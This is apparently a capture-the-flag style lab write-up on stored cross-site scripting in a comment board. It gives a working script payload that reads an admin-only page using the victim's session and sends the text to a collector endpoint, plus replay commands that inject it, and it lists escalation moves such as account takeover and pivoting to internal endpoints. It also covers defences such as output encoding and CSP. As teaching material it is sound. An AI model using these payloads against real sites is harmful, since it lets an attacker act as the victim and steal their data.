# Lab 21 — Board

## The bug

```python
f"<li><b>{htmlmod.escape(c['who'])}</b>: {c['body']}</li>"
```

One template, two policies. `who` is escaped; `body` is not. Nobody decided
that — it is what happens when escaping is applied by hand, per field, by
whoever was editing at the time.

The comment is *stored*, so the payload fires for every viewer without anybody
following a link. Stored XSS needs no delivery step, which makes it strictly
more severe than Lab 20's reflected one.

## The interesting half: `HttpOnly`

```python
.cookie("session", ADMIN_COOKIE, http_only=True)
```

`document.cookie` returns nothing. Beginners stop here. They should not.

> **Cross-site scripting does not need to read a credential. It needs to act as
> the person who has one.**

The cookie is attached by the browser to every same-origin request, whether or
not JavaScript is allowed to look at it. So do not steal the key — walk through
the door and carry out what is inside:

```javascript
fetch('/admin/api/flag')                 // the cookie rides along automatically
  .then(r => r.text())
  .then(t => fetch('/collect?id=drop1&c=' + encodeURIComponent(t)))
```

```bash
h5i websec replay req_0 --session lab21 --create \
    --set method=POST --set path=/api/comment \
    --set header.Content-Type=application/json \
    --set json.who=anon --set "json.body=<script>fetch('/admin/api/flag')…</script>"

h5i websec replay req_0 --session lab21 --create \
    --set path=/collected --set query.id=drop1
```

## What "acting as the victim" can mean

Escalate to whatever the application lets that role do:

* read a privileged page and exfiltrate its text (this lab)
* change the victim's email, then trigger a password reset to it
* add your account as an administrator, or add an API key
* approve your own pending request
* read the CSRF token out of a form and then submit the form (Lab 22) — same
  origin, so the token is readable and the protection is void
* pivot: fetch an internal-only endpoint the victim's browser can reach

The last two are why "we have CSRF tokens" and "that endpoint is
internal-only" are not answers to an XSS finding.

## What actually stops it

| Control | Effect on this attack |
| --- | --- |
| `HttpOnly` | blocks cookie theft, blocks nothing else |
| `SameSite` | irrelevant — the request is same-origin |
| CSRF token | irrelevant — the script can read it |
| CSP without `unsafe-inline` | **blocks the inline `<script>`** |
| output encoding | fixes it |

Only the last two are load-bearing. Encode `body` the way `who` is already
encoded, and if the field must carry markup, run it through an allowlist
sanitiser that parses and re-serialises. Then add a CSP with a nonce so that an
escape from the encoder is not immediately an escape from the origin.

## h5i technique

The bot again, and the collector pattern: exfiltrate to a place you can read
with a plain replay. If a payload does not land, prove the sink first with
`<script>fetch('/collect?id=x&c=alive')</script>` before assuming the injection
failed — the difference between "no XSS" and "no `onerror` handler" is an hour.
